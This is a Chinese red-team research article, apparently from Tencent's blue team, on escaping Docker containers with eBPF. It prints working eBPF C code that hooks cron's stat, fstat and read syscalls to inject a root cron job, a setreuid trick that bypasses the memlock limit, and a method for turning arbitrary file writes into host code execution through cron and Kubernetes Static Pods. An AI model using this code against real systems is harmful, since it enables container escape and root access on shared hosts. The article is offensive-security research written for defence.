@@ -1,0 +1,658 @@
+
+共同作者： Pass
+
+----------------------------
+
+前言
+--
+
+容器安全是一个庞大且牵涉极广的话题，而容器的安全隔离往往是一套纵深防御的体系，牵扯到 AppArmor、Namespace、Capabilities、Cgroup、Seccomp 等多项内核技术和特性，但安全却是一处薄弱则全盘皆输的局面，一个新的内核特性可能就会让看似无懈可击的防线存在突破口。随着云原生技术的快速发展，越来越多的容器运行时组件在新版本中会默认配置 AppArmor 策略，原本我们在《红蓝对抗中的云原生漏洞挖掘及利用实录》介绍的多种容器逃逸手法会逐渐失效；因此我们希望能碰撞出一些攻击手法，进而突破新版本容器环境的安全能力，并使用更契合容器集群的新方式把 “任意文件写” 转化为“远程代码执行”，从而提前布防新战场。
+
+结合腾讯蓝军近几年在云原生安全上的积累以及我们在 WHC2021 上分享的关于《多租户容器集群权限提升的攻防对抗》的议题，本文将着重探讨内核特性 eBPF 对容器安全性的挑战和云原生攻防场景下的实践。
+
+使用 eBPF 的容器逃逸技术
+---------------
+
+### eBPF 简介
+
+eBPF 作为传统 BPF 的后继者，自内核 3.17 版本开始进入 Linux 内核。它提供了一种无需加载内核模块也能在内核里执行代码的功能，方式是在内核中实现了一个虚拟机，用于执行经过安全检查的字节码。
+
+eBPF 可以应用在安全、跟踪、性能分析、网络数据包处理、观测、监控等不同领域。
+
+eBPF 可以使用 c 语法的子集来编写，然后使用 LLVM 编译出 eBPF 字节码。
+
+作为一个较新的内核特性，近些年来有许多利用这项新技术来解决一些安全问题的讨论和研究。使用 eBPF 我们可以使用诸如 `kprobe` 、 `tracepoint` 的跟踪技术，因此在防御的角度，可以用于实现 HIDS、各种日志的监控等；而站在攻击者的角度，eBPF 可以任意修改用户空间的内存，可以挂钩网络数据，这提供了很好的捷径用于编写 `Rootkit` ，同时作为一个新的内核特性，也给了漏洞挖掘人员一个新攻击面。
+
+本文不过多描述 eBPF 的核心概念、eBPF 程序如何编写，展开讲会失去文章的重点，下面给出几个文章可以帮助读者快速了解 eBPF 和入门知识：
+
+•What is eBPF[1]•BPF and XDP Reference Guide[2]•The art of writing eBPF programs: a primer.[3]
+
+### 新的弱点
+
+Docker 使用 AppArmor 来进一步限制容器，保证隔离的安全，其中有一个让很多逃逸技术失效的限制是禁用了 mount(https://github.com/moby/moby/blob/4283e93e6431c5ff6d59aed2104f0942ae40c838/profiles/apparmor/template.go#L44)，换言之，即使攻击者获取了一个 `CAP_SYS_ADMIN` 权限的容器，他也很难用一些和 file system 有关的逃逸手法。那有没有什么不需要和各种伪文件系统交互的方法呢？有一些，比如如果有 `CAP_DAC_READ_SEARCH` 权限，那么可以使用系统调用来实现逃逸至宿主机的 root file system。从内核 4.17 版本开始，可以通过`perf_event_open`来创建`kprobe`和`uprobe`，并且`tracepoint`子系统新增了一个`raw_tracepoint`类型，该类型也是可以通过简单的系统调用来使用，结合 eBPF 的使用，这就给了攻击者可乘之机。
+
+### 容器逃逸分析
+
+要想使用 eBPF，需要一些权限和挂载伪文件系统，下表展示了 eBPF kprobe、tracepoint 使用的条件：
+
+<table><thead><tr><td>特性 / 功能</td><td>要求</td></tr></thead><tbody><tr><td>bpf 系统调用</td><td>拥有 CAP_SYS_ADMIN; kernel 5.8 开始拥有 CAP_SYS_ADMIN 或者 CAP_BPF</td></tr><tr><td>Unprivileged bpf - "socket filter" like</td><td>kernel.unprivileged_bpf_disabled 为 0 或拥有上述权限</td></tr><tr><td>perf_event_open 系统调用</td><td>拥有 CAP_SYS_ADMIN; kernel 5.8 开始拥有 CAP_SYS_ADMIN 或者 CAP_PERFMON</td></tr><tr><td>kprobe</td><td>需要使用 tracefs; kernel 4.17 后可用 perf_event_open 创建</td></tr><tr><td>tracepoint</td><td>需要使用 tracefs</td></tr><tr><td>raw_tracepoint</td><td>kernel 4.17 后通过 bpf 调用 BPF_RAW_TRACEPOINT_OPEN 即可</td></tr></tbody></table>
+
+eBPF program 作为附加在内核特定 hook point 的应用，在加载 eBPF program 时，并不会考虑被 hook 的进程是处于哪个 namespace，又处于哪个 cgroup，换句话说即使处在容器内，也依旧可以 hook 容器外的进程。
+
+Linux kernel 为 eBPF 程序提供了一系列固定的函数，这些函数被称为 `BPF-HELPERS` ，它们为 eBPF 程序提供了一定程度上的内核功能，可以使用 `man bpf-helpers` 来查看有哪些 helper。而不同的 eBPF program type 能调用的 helper 也不同，关于 tracing 的 helper 里比较有意思的是下面几个：
+
+•bpf_probe_read：安全地从内核空间读取数据 •bpf_probe_write_user：尝试以一种安全的方式向用户态空间写数据 •bpf_override_return：用于 `error injection` ，可以用于修改 kprobe 监控的函数返回值
+
+这些 helper 提供了读写整个机器上任意进程用户态空间的功能，同时提供了内核空间的读取数据功能，当攻击者能向内核加载 eBPF 程序，那么有许多种办法进行权限提升或者容器逃逸：
+
+• 读取内核空间里的敏感信息，或者 hook 关键系统调用的返回点，获取其他进程空间里的敏感信息 • 修改其他高权限进程里的数据，注入 shellcode 或者改变进程关键执行路径执行自己的命令 • 其他更有想象力的方法...
+
+需要注意的是 eBPF 无法改变进入 Syscall 时的参数，但是可以改变用户态进程空间里的内存数据。
+
+有了上述思路，shellcode 暂且不论，有什么进程或服务是 linux 各个发行版最常见，并且可以拿来执行命令的呢？对，那就是安全和运维的老朋友 `cron` 了。 `cron` 作为计划任务用的 linux 最常见服务，可以定时执行任务，甚至可以指定用户，而且由于需要及时更新配置文件，调用相关文件 syscall 十分频繁，用 eBPF 来 hook 再简单不过。
+
+`cron` 其实有许多不同的实现，因此若从蓝军角度来看需要针对不同的 cron 实现进行分析，这里挑选 `vixie-cron` (https://github.com/vixie/cron) 作为分析对象， `vixie-cron` 是一个较多 linux 发行版使用的 cron 实现，像 `debian` 、 `centos` 都是用的这个实现，当然不同发行版也会有一些定制修改，这个在稍后分析中会简单提及。
+
+### vixie-cron 分析
+
+`vixie-cron` 的整体逻辑比较简单，它有一个主循环，每次等待一段时间后都会执行任务并加载 `cron` 的一些配置文件，加载相关的配置文件的关键函数 `load_database` 位于 https://github.com/vixie/cron/blob/690fc534c7316e2cf6ff16b8e83ba7734b5186d2/database.c#L47。
+
+在正式读取配置之前，它会先获取一些文件和目录的文件信息：
+
+```
+load_database(cron_db *old_db) {
+    // ...
+    /* before we start loading any data, do a stat on SPOOL_DIR
+     * so that if anything changes as of this moment (i.e., before we've
+     * cached any of the database), we'll see the changes next time.
+     */
+    if (stat(SPOOL_DIR, &statbuf) < OK) {
+        log_it("CRON", getpid(), "STAT FAILED", SPOOL_DIR);
+        (void) exit(ERROR_EXIT);
+    }
+  // ...
+
+```
+
+`SPOOL_DIR` 是一个宏，代表了存放 crontabs 文件的目录，默认为 `tabs` ，但在常见的发行版中对有关路径的宏做了定制，比如下面是 debian 关于路径的修改：
+
+```
+-#define CRONDIR        "/var/cron"
++#define CRONDIR        "/var/spool/cron"
+ #endif
+             /* SPOOLDIR is where the crontabs live.
+@@ -39,7 +39,7 @@
+              * newer than they were last time around (or which
+              * didn't exist last time around...)
+              */
+-#define SPOOL_DIR    "tabs"
++#define SPOOL_DIR    "crontabs"
+
+```
+
+因此 `SPOOL_DIR` 代表的就是我们熟悉的 `/var/spool/cron/crontabs` 目录。
+
+然后会获取系统 `crontab` 的信息：
+
+```
+    if (stat(SYSCRONTAB, &syscron_stat) < OK)  // #define SYSCRONTAB    "/etc/crontab"
+        syscron_stat.st_mtim = ts_zero;
+
+```
+
+接下来是两个判断，如果判断通过，则进入处理系统 `crontab` 的函数：
+
+```
+    if (TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))) {
+        Debug(DLOAD, ("[%ld] spool dir mtime unch, no load needed.\n",
+                  (long)getpid()))
+        return;
+    }
+    // ...
+    if (!TEQUAL(syscron_stat.st_mtim, ts_zero))
+        process_crontab("root", NULL, SYSCRONTAB, &syscron_stat,
+                &new_db, old_db);
+
+```
+
+这两个判断比较有意思的地方是当老的配置的 `mtime` 和新的文件 `mtime` 不同即可进入处理流程，而新的文件 `mtime` 是 `SPOOL_DIR` 和 `SYSCRONTAB` 中的最大值。
+
+从上述分析可以得出结论，当我们用 eBPF 程序去 attach `stat` syscall 返回的时候，如果能够修改返回的`struct stat`buf 里的数据，就可以成功让 `vixie-cron`立刻去处理`/etc/crontab`。
+
+最后在 `process_crontab` 里还有一次判断：
+
+```
+    if (fstat(crontab_fd, statbuf) < OK) {
+        log_it(fname, getpid(), "FSTAT FAILED", tabname);
+        goto next_crontab;
+    }
+    // ...
+    if (u != NULL) {
+        /* if crontab has not changed since we last read it
+         * in, then we can just use our existing entry.
+         */
+        if (TEQUAL(u->mtim, statbuf->st_mtim)) {
+            Debug(DLOAD, (" [no change, using old data]"))
+            unlink_user(old_db, u);
+            link_user(new_db, u);
+            goto next_crontab;
+        }
+
+```
+
+只是这处判断用的是 `fstat` 。
+
+### eBPF program 编写
+
+内核提供给用户使用的仅仅是 `bpf` 系统调用，因此有一系列工具来帮助使用者更方便简单地编写和使用 eBPF。比较主流的两个前端是 `bcc` (https://github.com/iovisor/bcc) 和 `libbpf` (https://github.com/libbpf/libbpf)。考虑到部署的方便性，如果使用 bcc，它的大量依赖会影响蓝军实战中的可用性，所以本文在编写测试的时候使用的是 libbpf，而且 libbpf 有社区提供的一个 “脚手架”：https://github.com/libbpf/libbpf-bootstrap 。使用这个也可以非常方便快捷地开发出自己的 eBPF program。
+
+本文修改 libbpf-bootstrap 中的 minimal 示例程序来加载自己的 eBPF program。接下来就让我们了解一下整个 eBPF 程序的完整流程。
+
+```
+#define BPF_NO_PRESERVE_ACCESS_INDEX
+#include "vmlinux.h"
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
+// ...
+
+```
+
+libbpf-bootstrap 自带的 `vmlinux.h` 是通过 `bpftool` 导出的内核数据结构的定义，这个文件主要是用于实现 bpf 的 `CO-RE` ，即编译一次到处执行，这里只是用到了 `vmlinux.h` 里带的内核数据结构的定义。
+
+`BPF_NO_PRESERVE_ACCESS_INDEX` 实际上是 `vmlinux.h` 里的一个 `BTF` 引用开关，如果没有定义这个宏，那么在 eBPF 中任意引用了 `vmlinux.h` 中的数据结构定义都会在 clang 生成的 eBPF object 文件里留下记录，这样编译出来的 eBPF 程序如果在没有嵌入 `BTF` 类型信息的内核上是无法加载的，这里为了保证能稳定加载，所以关闭了 clang 生成 `BTF` 重定向信息的功能。
+
+本文挑选的是使用 `raw_tracepoint` 来 hook 系统调用， `raw_tracepoint/sys_enter` 用于将 eBPF 程序 attach 到进入系统调用时：
+
+```
+// ...
+#define TARGET_NAME "cron"
+// ...
+SEC("raw_tracepoint/sys_enter")
+int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
+{
+    unsigned long syscall_id = ctx->args[1];
+    char comm[TASK_COMM_LEN];
+    bpf_get_current_comm(&comm, sizeof(comm));
+    // executable is not cron, return
+    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME)))
+        return 0;
+    switch (syscall_id)
+    {
+        case 0:
+            handle_enter_read(ctx);
+            break;
+        case 3:  // close
+            handle_enter_close(ctx);
+            break;
+        case 4:
+            handle_enter_stat(ctx);
+            break;
+        case 5:
+            handle_enter_fstat(ctx);
+            break;
+        case 257:
+            handle_enter_openat(ctx);
+            break;
+        default:
+            return 0;
+    }
+}
+
+```
+
+这个 eBPF 程序比较简单，判断进程文件名是否是我们想要的进程文件，这里是 `cron` ，接下来根据系统调用进入不同的逻辑。
+
+不过光 hook 进入 syscall 可不够，我们需要在 syscall 返回时马上修改已经返回至用户态空间的返回数据，比如说 `struct stat` buf，因此还要再来一个 eBPF 程序：
+
+```
+SEC("raw_tracepoint/sys_exit")
+int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
+{
+    if (cron_pid == 0)
+        return 0;
+    int pid = bpf_get_current_pid_tgid() & 0xffffffff;
+    if (pid != cron_pid)
+        return 0;
+    unsigned long id;
+    struct pt_regs *regs = ctx->args[0];
+    bpf_probe_read_kernel(&id, sizeof(id), ®s->orig_ax);
+    switch (id)
+    {
+        case 0:
+            handle_read(ctx);
+            break;
+        case 4:
+            handle_stat();
+            break;
+        case 5:
+            handle_fstat();
+            break;
+        case 257:
+            handle_openat(ctx);
+            break;
+        default:
+            return 0;
+    }
+}
+
+```
+
+这段程序和 `sys_enter` 的程序大致一样，只是从文件名换成了 pid 的判断，而 pid 的获取可以从 `sys_enter` 的时候获取到，另外此时已经处于执行完 syscall 的状态，因此 `AX` 寄存器里并不会存放 syscall 的 id，但是 `pt_regs` 结构有个字段 `orig_ax` 存放了原始的 syscall id，从这可以获取到。
+
+在编写具体处理不同系统调用之前，我们需要了解到，eBPF 程序是没有全局变量的，在较新版本的 clang 和内核上为什么可以使用 c 的全局变量语法呢，其实 libbpf 在背后会帮我们转换成 `BPF_MAP_TYPE_ARRAY` 类型的 map，而 eBPF 的 map 是可以在不同 eBPF 程序间甚至不同进程间共享的。
+
+处理 stat 系统调用相关代码：
+
+```
+static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx)
+{
+    struct pt_regs *regs;
+    const char *pathname;
+    char buf[64];
+    regs = (struct pt_regs *)ctx->args[0];
+    bpf_probe_read(&pathname, sizeof(pathname), ®s->di);
+    bpf_probe_read_str(buf, sizeof(buf), pathname);
+    if (memcmp(buf, CRONTAB, sizeof(CRONTAB)) && memcmp(buf, SPOOL_DIR, sizeof(SPOOL_DIR)))
+        return 0;
+    if (cron_pid == 0)
+    {
+        cron_pid = bpf_get_current_pid_tgid() & 0xffffffff;
+    }
+    memcpy(filename_saved, buf, 64);
+    bpf_probe_read(&statbuf_ptr, sizeof(statbuf_ptr), ®s->si);
+    return 0;
+}
+
+```
+
+首先判断读取的文件是否为 `/etc/crontab` 或者 `crontabs` ，这些路径是 cron 用于判断相关配置文件是否被修改了的路径，随后会保存 pid、filename、用于接受文件信息的用户态 buf 指针到全局变量里。
+
+处理 stat 系统调用返回的代码：
+
+```
+static __inline int handle_stat()
+{
+    if (statbuf_ptr == 0)
+        return 0;
+    bpf_printk("cron %d stat %s\n", cron_pid, filename_saved);
+    // conditions:
+    // 1. !TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))
+    // 2. !TEQUAL(syscron_stat.st_mtim, ts_zero)
+    __kernel_ulong_t spool_st_mtime = 0;
+    __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() % 0xfffff;
+    if (!memcmp(filename_saved, SPOOL_DIR, sizeof(SPOOL_DIR)))
+    {
+        bpf_probe_write_user(&statbuf_ptr->st_mtime, &spool_st_mtime, sizeof(spool_st_mtime));
+    }
+    if (!memcmp(filename_saved, CRONTAB, sizeof(CRONTAB)))
+    {
+        bpf_probe_write_user(&statbuf_ptr->st_mtime, &crontab_st_mtime, sizeof(crontab_st_mtime));
+    }
+    print_stat_result(statbuf_ptr);
+    statbuf_ptr = 0;
+}
+
+```
+
+在 stat 返回时，我们需要让上节提到的两个条件均通过，同时为了保证在 eBPF 程序 detach 后， `cron` 可以立刻更新为正常的配置，这里将 `SPOOL_DIR` 的 `mtime` 设为 0， `CRONTAB` 设为一个随机的较小数值，这样 `cron` 记录的上一次修改时间就会是这个较小的时间，在下一次循环时会马上更新成原来的配置。
+
+修改 `fstat` 返回的代码与 `stat` 大同小异，只是需要我们先 hook `openat` 的返回处并保存打开的文件描述符的值：
+
+```
+static __inline void handle_openat(struct bpf_raw_tracepoint_args *ctx)
+{
+    if (!memcmp(openat_filename_saved, CRONTAB, sizeof(CRONTAB)))
+    {
+        open_fd = ctx->args[1];
+        bpf_printk("openat: %s, %d\n", openat_filename_saved, open_fd);
+        openat_filename_saved[0] = '\0';
+    }
+}
+
+```
+
+然后当 `fstat` 获取该文件的信息时修改返回值即可。
+
+最后就是在读取文件信息的时候修改处于进程内存里的返回数据，即 hook `read` 系统调用返回的时候：
+
+```
+static __inline void handle_read(struct bpf_raw_tracepoint_args *ctx)
+{
+    if (read_buf == 0)
+        return;
+    ssize_t ret = ctx->args[1];
+    if (ret <= 0)
+    {
+        read_buf = 0;
+        return;
+    }
+    if (ret < sizeof(PAYLOAD))
+    {
+        bpf_printk("PAYLOAD too long\n");
+        read_buf = 0;
+        return;
+    }
+    bpf_probe_write_user(read_buf, PAYLOAD, sizeof(PAYLOAD));
+    read_buf = 0;
+}
+
+```
+
+这里的 payload 就是任意的符合 cron 语法的规则，例如 `* * * * * root /bin/bash -c 'date > /tmp/pwned' #` ，由于 `vixie-cron` 命令不支持多行，所以仅需在最后加个注释符 `#` 即可保证后面的命令被注释掉，时间选择每分钟都会触发，由于上面 `stat` 返回的是较小 `mtime` ，停止 eBPF 程序后也可以马上恢复成原来的 cron 规则。
+
+编译后在拥有 `CAP_SYS_ADMIN` 权限其他配置默认的 root 用户容器内运行一下，：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5ia9LqXx4HVeKfGiaAzzdUDaZILSR0PKlpvx9bLicjMWUqGSqzE6ic8mLxQgXBVErOhuyA8lGNeeGQvQ/640?wx_fmt=png)
+
+同时运行 `journalctl -f -u cron` 观察一下 `cron` 输出的日志：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5ia9LqXx4HVeKfGiaAzzdUDaM8lq8YsOqVtz7UsbUz5b0BcAp2ic3NiaSkq4XxK5ZQmpQWgciaqxPos3w/640?wx_fmt=png)
+
+命令成功执行：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5ia9LqXx4HVeKfGiaAzzdUDaucMHBbPS04Vice2hZAayPN6j9ibocjlKoMSXJwnF5CA1iatHLSI5BYzPw/640?wx_fmt=png)
+
+### RLIMIT 限制绕过
+
+Linux kernel 为了保证 eBPF 程序的安全性，在加载的时候添加了许多限制，包括指令长度、不能有循环、tail call 嵌套有上限等等，还有资源上的限制，在 kernel 5.11 之前，kernel 限制 eBPF 程序的内存占用使用的上限是 `RLIMIT_MEMLOCK` 的值，这个值可能会非常小，比如在 docker 容器内默认为 `64KB` ，并且内核在计算 eBPF 程序内存使用量的时候是 `per-user` 模式，并非是每个进程单独计算，而是跟随 `fork` 来计算某个用户使用的总量。容器新启动的时候默认是 root 用户并且处于 `initial user namespace` ，而且宿主机的 root 用户往往会先占用一部分的影响 `memlock` 的内存，这样就会导致 eBPF 程序在容器内因为 rlimit 限制无法成功加载。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5ia9LqXx4HVeKfGiaAzzdUDamZ4CfjoSOVgricUDF7UWs5usnVXf6HavickJokU8NOQgQ81icY252tyaA/640?wx_fmt=png)
+
+让我们来简要分析一下内核是如何计算 eBPF 占用内存的：
+
+```
+// https://elixir.bootlin.com/linux/v5.10.74/source/kernel/bpf/syscall.c#L1631
+int __bpf_prog_charge(struct user_struct *user, u32 pages)
+{
+    unsigned long memlock_limit = rlimit(RLIMIT_MEMLOCK) >> PAGE_SHIFT;
+    unsigned long user_bufs;
+    if (user) {
+        user_bufs = atomic_long_add_return(pages, &user->locked_vm);
+        if (user_bufs > memlock_limit) {
+            atomic_long_sub(pages, &user->locked_vm);
+            return -EPERM;
+        }
+    }
+    return 0;
+}
+void __bpf_prog_uncharge(struct user_struct *user, u32 pages)
+{
+    if (user)
+        atomic_long_sub(pages, &user->locked_vm);
+}
+
+```
+
+加载和卸载 eBPF 程序时使用上面两个函数进行内存消费的计算，可以看到，计算占用内存的字段是位于 `user_struct` 的 `locked_vm` 字段，而 `user_struct` 实际上内核代表用户 credential 结构 `struct cred` 的 user 字段：
+
+```
+struct cred {
+    //...
+    struct user_struct *user;    /* real user ID subscription */
+    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+    struct group_info *group_info;    /* supplementary groups for euid/fsgid */
+    /* RCU deletion */
+    union {
+        int non_rcu;            /* Can we skip RCU deletion? */
+        struct rcu_head    rcu;        /* RCU deletion hook */
+    };
+} __randomize_layout;
+
+```
+
+linux 在创建新进程时，仅会简单的调用 `copy_creds` （https://elixir.bootlin.com/linux/v5.10.75/source/kernel/fork.c#L1981）, 而 `copy_creds` 会调用 `prepare_creds` ，这个函数仅仅是给原来的 `struct user_struct` 添加了一个引用计数，并没有新分配一个 `user_struct` ，这样就实现了对单个用户的内存占用计算。
+
+```
+static inline struct user_struct *get_uid(struct user_struct *u)
+{
+    refcount_inc(&u->__count);
+    return u;
+}
+struct cred *prepare_creds(void)
+{
+    struct task_struct *task = current;
+    const struct cred *old;
+    struct cred *new;
+    // ...
+    old = task->cred;
+    memcpy(new, old, sizeof(struct cred));
+    // ...
+    get_uid(new->user);
+    // ...
+}
+
+```
+
+上面说到，eBPF 限制内存使用是 `per-user` 的，那么如果我们创建一个不同的 user 呢？进程的 cred 如果属于一个新的 user，那么就会新建一个新的 `user_struct` ，此时 `locked_vm` 的值就会初始化为 0。
+
+由于内核根据 uid 来保存 `user_struct` ，所以创建的 user 的 uid 不能为 0，不然就会继续引用原来的 root 的 `user_struct` ，并且 eBPF 需要 `CAP_SYS_ADMIN` 权限，我们要让一个普通用户有这个权限有很多种办法：
+
+• 设置加载 eBPF 程序文件的 File Capabilities，创建新用户，切换到新用户执行设置好 Cap 的文件 • 在 root 用户情况下改变 setuid，并且设置`SECBIT_KEEP_CAPS` `securebits`• 在 root 用户情况下仅改变`real uid`
+
+这里介绍第三种办法，因为实现起来是最简单的办法。
+
+我们简要看下 `setreuid` 系统调用在什么情况下会改变 `user_struct` :
+
+```
+// https://elixir.bootlin.com/linux/v5.10.75/source/kernel/sys.c#L502
+long __sys_setreuid(uid_t ruid, uid_t euid)
+{
+    // ...
+  kruid = make_kuid(ns, ruid);
+  // ...
+    if (ruid != (uid_t) -1) {
+        new->uid = kruid;
+        if (!uid_eq(old->uid, kruid) &&
+            !uid_eq(old->euid, kruid) &&
+            !ns_capable_setid(old->user_ns, CAP_SETUID))
+            goto error;
+    }
+    // ...
+    if (!uid_eq(new->uid, old->uid)) {
+        retval = set_user(new);
+        if (retval < 0)
+            goto error;
+    }
+    // ...
+}
+
+```
+
+当设置的 ruid 不等于之前的 ruid 就会设置新的 `user_struct` ，而由于没有设置其他的 id 比如 `euid` ，capabilities 也不会被清空，参考 capabilities manual：
+
+> If one or more of the real, effective or saved set user IDs was previously 0, and as a result of the UID changes all of these IDs have a nonzero value, then all capabilities are cleared from the permitted, effective, and ambient capability sets.
+
+翻译过来就是当 ruid、euid、suid 至少有一个为 0，这些 id 都变成非 0 值时，会将 permitted、effective、ambient 集清空。
+
+那么 c 语言的实现就很简单了：
+
+```
+    int ret;
+    if ((ret=setreuid(65535, -1)) != 0)
+    {
+        printf("setreuid failed: %d\n", ret);
+        return 0;
+    }
+
+```
+
+在加载 eBPF 程序之前在用户态代码前加上这些代码就能绕过限制了。
+
+从内核 5.11 开始，计算 eBPF 内存占用使用的是 `cgroup` 来计算，一般来说内存限制会变得很宽松，就不会遇到这种问题。
+
+AFW 到 RCE 新方法
+-------------
+
+控制服务器程序的配置、脚本等文件的内容进行任意代码执行是渗透和漏洞挖掘中常用的手法，从 “任意文件写” 提升到 “任意代码执行” 的利用手段也层出不穷，上述我们针对业界最常用到的计划任务组件 Cron 进行利用，实现了从容器到母机的任意代码执行（逃逸）。如果从上文读到这里，读者也能意识到，在容器场景里 “写文件” 的方式和方法将更加灵活，也因此，历史上我们常遇到的 “crontab 明明写进去了，但是 shell 一直不来” 的这类情况也会更加普遍。而且，容器和 Kubernetes 安全的最佳实践建议我们应该减少节点和容器内的非必要组件，容器节点会尝试不再安装和运行 Cron 进程，最终母机节点里仅运行 kubelet 进程的情况是最理想的。种种现状，促使我们重新分析了 Cron 的现有实现，也开始思考云原生时代任意文件写的利用是否有新的 TIPS。
+
+### Cron 的局限性
+
+### 不同的 Cron 实现
+
+最直观的问题就是：在漏洞利用的时候，我们不清楚目标服务器的 Cron 是哪一个实现。除了上述提到的 `vixie-cron` (https://github.com/vixie/cron)，还有两种 Cron 的实现是非常普遍的：
+
+1.busybox-cron (https://git.busybox.net/busybox/tree/?h=1_34_stable)2.cronie (https://github.com/cronie-crond/cronie)
+
+不同的 cron 实现对漏洞利用的影响主要在于：1、配置文件的路径不一致，2、配置文件的格式不一致，3、检查配置文件更新或监控新配置文件的逻辑有不一致的实现，这些都会影响黑盒或部分白盒场景的漏洞利用的稳定性。
+
+我们把 Linux cron 计划任务能执行命令的文件简单分为了四类：
+
+1.`* * * * * username command` 格式，/etc/crontab，/etc/cron.d/* 等路径 2.`* * * * * command` 格式， /var/spool/cron/ 等路径 3.`period-in-days delay-in-minutes job-identifier command` 格式，/etc/anacrontab 等路径 4. 可执行脚本文件， /etc/cron.daily/* ， /etc/cron.hourly/* ， /etc/cron.monthly/* ， /etc/cron.weekly/* 等路径
+
+当然，如果是恶意程序，可能会简单粗暴的把所有路径都写一遍；但是如果是授权的红蓝对抗，如果考虑对抗和业务稳定，暴力利用显然是不现实的；更加值得注意的是，大部分情况我们挖掘到的任意文件写在利用时存在局限，例如无法对文件进行内容上的追加、无法设置文件的可执行权限、无法覆盖现有文件等等。
+
+也有即使你暴力写入了所有配置文件， cron 却没有进入加载新配置流程的情况，那就要从源码上看一下 cron 对监控新任务的实现，也就是下文我们要说到的 st_mtime。
+
+### 对 st_mtime 的依赖
+
+在我们代码审计的所有 Cron 实现中，无一例外，察觉到文件更新的方式都是对比配置文件路径的 st_mtime。在操作系统层面，文件夹内任何文件编辑、新增、删除、修改等操作，操作系统都会更新 st_mtime。如图：
+
+![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5ia9LqXx4HVeKfGiaAzzdUDagTjjwfUfkD4CFZG0KS9uI4YRiavRa7xicALKFRMmvP0DowEPfB8Rcibbg/640?wx_fmt=png)
+
+但是如上文所述中, 利用 eBPF 的手法却不会促使操作系统自动更新目录的 st_mtime，所以我们需要编写 eBPF 代码 attach `stat` 的 syscall，促使 Cron 进程误以为 crontab 更新了，进而执行我们新创建的计划任务。而有更多场景无法做到伪造或更新 st_mtime，例如使用 debugfs 命令 进行任意文件写利用的场景，这是一个极其危险又充满变数的利用方式，但在容器场景中却不少见，可以参考 rewrite-cgroup-devices[4] 场景和 lxcfs-rw[5] 场景。
+
+诚然， Cron 实践中还有每个小时（60 分钟）不检查 st_mtime 强制更新新任务的实现（代码如下图），但包含这个设计的实现目前运用比较广泛的仅有 busybox-cron，会使 EXP 变得小众且不通用；如果你发现原本已经放弃的命令执行利用，吃个饭后 Shell 居然过来了，可能就是这个原因。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5ia9LqXx4HVeKfGiaAzzdUDa4LnXbO3UHaibN7ZTaI0KW4piabUlL68N8HeNzkz91kTdA1IMqfShXibJg/640?wx_fmt=png)
+
+另外一个不依赖于 st_mtime 更新且最快只有每个小时执行一次的文件是上面提到的第四类文件，目录 /etc/cron.hourly/。因为这类文件使用 run-part 触发，任务已经写入了 cron 之中，run-part 会执行目录下的所有可执行脚本，没有 st_mtime 限制；但这类文件在写入时必须赋予可执行权限，不然 run-part 不会执行漏洞利用写入的脚本。
+
+那有没有云原生时代下更为通用且更加兼容的利用方法使我们的 EXP 更加 “云原生” 呢？
+
+### 利用 Static Pod
+
+利用 Static Pod 是我们在容器逃逸和远程代码执行场景找到的解决方案，他是 Kubernetes 里的一种特殊的 Pod，由节点上 kubelet 进行管理。在漏洞利用上有以下几点明显的优势：
+
+1、 仅依赖于 kubelet
+
+Static Pod 仅依赖 kubelet，即使 K8s 的其他组件都奔溃掉线，删除 apiserver，也不影响 Static Pod 的使用。在 Kubernetes 已经是云原生技术事实标准的现在，kubelet 几乎运行与每个容器母机节点之上。
+
+2、 配置目录固定
+
+Static Pod 配置文件写入路径由 kubelet config 的 staticPodPath 配置项管理，默认为 /etc/kubernetes/manifests 或 /etc/kubelet.d/，一般情况不做更改。
+
+3、 执行间隔比 Cron 更短
+
+通过查看 Kubernetes 的源码，我们可以发现 kubelet 会每 20 秒监控新的 POD 配置文件并运行或更新对应的 POD；由 `c.FileCheckFrequency.Duration = 20 * time.Second` 控制，虽然 Cron 的每分钟执行已经算是非常及时，但 Static Pod 显然可以让等待 shell 的时间更短暂，对比 /etc/cron.daily/* ， /etc/cron.hourly/* ， /etc/cron.monthly/* ， /etc/cron.weekly/* 等目录就更不用说了。
+
+另外，Cron 的分钟级任务也会遇到重复多次执行的问题，增加多余的动作更容易触发 IDS 和 IPS，而 Static Pod 若执行成功就不再调用，保持执行状态，仅在程序奔溃或关闭时可自动重启
+
+4、 进程配置更灵活
+
+Static Pod 支持 Kubernetes POD 的所有配置，等于可以运行任意配置的容器。不仅可以配置特权容器和 HostPID 使用 nscenter 直接获取容器母机权限；更可以配置不同 namespace、capabilities、cgroup、apparmor、seccomp 用于特殊的需求。
+
+灵活的进程参数和 POD 配置使得 Static Pod 有更多方法对抗 IDS 和 IPS，因此也延生了很多新的对抗手法，这里就不再做过多介绍。
+
+5、 检测新文件或文件变化的逻辑更通用
+
+最重要的是，Static Pod 不依赖于 st_mtime 逻辑，也无需设置可执行权限，新文件检测逻辑更加通用。
+
+```
+func (s *sourceFile) extractFromDir(name string) ([]*v1.Pod, error) {
+    dirents, err := filepath.Glob(filepath.Join(name, "[^.]*"))
+    if err != nil {
+        return nil, fmt.Errorf("glob failed: %v", err)
+    }
+    pods := make([]*v1.Pod, 0, len(dirents))
+
+```
+
